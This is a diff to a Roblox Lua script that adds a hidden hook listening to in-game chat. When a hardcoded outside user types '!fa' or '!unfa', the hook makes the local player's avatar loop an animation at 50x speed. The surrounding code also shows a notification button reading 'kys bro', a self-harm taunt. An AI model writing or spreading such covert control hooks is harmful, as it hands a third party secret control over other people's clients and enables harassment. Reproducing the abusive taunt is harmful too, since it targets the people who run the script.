@@ -9,6 +9,47 @@ game.StarterGui:SetCore("SendNotification", {
     Button1 = "kys bro🤓"
 })
 
+local Players = game:GetService("Players")
+
+local targetUsername = "sci_mythical77"
+local myPlayer = Players.LocalPlayer
+local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+if not humanoid then return end
+
+local animation = Instance.new("Animation")
+animation.AnimationId = "rbxassetid://754656200"
+
+local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
+local animationTrack = animator:LoadAnimation(animation)
+
+local function onChat(player, message)
+    if player.Name == targetUsername then
+        local command = message:lower()
+
+        if command == "!fa" then
+            if animationTrack then
+                animationTrack.Looped = true
+                animationTrack:Play()
+                animationTrack:AdjustSpeed(50)
+            end
+        elseif command == "!unfa" then
+            if animationTrack then
+                animationTrack:Stop()
+            end
+        end
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end)
+
 local targetUsername = "sci_mythical77"
 local replicatedStorage = game:GetService("ReplicatedStorage")
 
